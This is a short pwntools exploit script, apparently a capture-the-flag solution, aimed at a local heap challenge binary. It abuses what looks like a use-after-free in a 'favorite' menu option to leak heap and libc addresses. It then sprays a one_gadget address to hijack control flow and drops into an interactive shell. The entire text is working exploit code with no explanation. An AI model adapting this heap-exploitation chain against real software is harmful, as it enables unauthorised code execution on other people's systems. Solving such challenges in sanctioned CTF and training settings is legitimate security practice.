from pwn import *

e = ELF("./bin/chall")

#p = process(e.path)
p = remote("localhost", 1337)

def alloc(idx, s="AAAA"):
  print(p.sendlineafter("choice:", "0"))
  print(p.sendlineafter(":", str(idx)))
  print(p.sendlineafter(":", s))

def fav(idx):
  p.sendlineafter("choice:", "1")
  p.sendlineafter(":", str(idx))

alloc(0, "A" * 0x500)
fav(0)
alloc(0)

p.sendlineafter("choice:", "2")
p.recvuntil("name: ")
leak = p.recvline(keepends=False)

hleak = u64(leak[72:72+8])
print(hex(hleak))

alloc(1, (
  p64(hleak - 0x560d9b1ea290 + 0x560d9b1eab00 + 0x200)
  + p64(hleak - 0x560d9b1ea290 + 0x560d9b1eab00)
  + p64(8)
  ).ljust(0x1e, b"A")
)


p.sendlineafter("choice:", "2")
p.recvuntil("name: ")
leak = u64(p.recvline(keepends=False)[:8]) - 0x7fc4f6266ca0 + 0x00007fc4f5e7b000
print(hex(leak))

if leak % 0x1000 != 0:
  print("messed up leak")
  exit(1)

alloc(2, p64(leak + 0x4f432) * (0x600 // 8))

p.interactive()
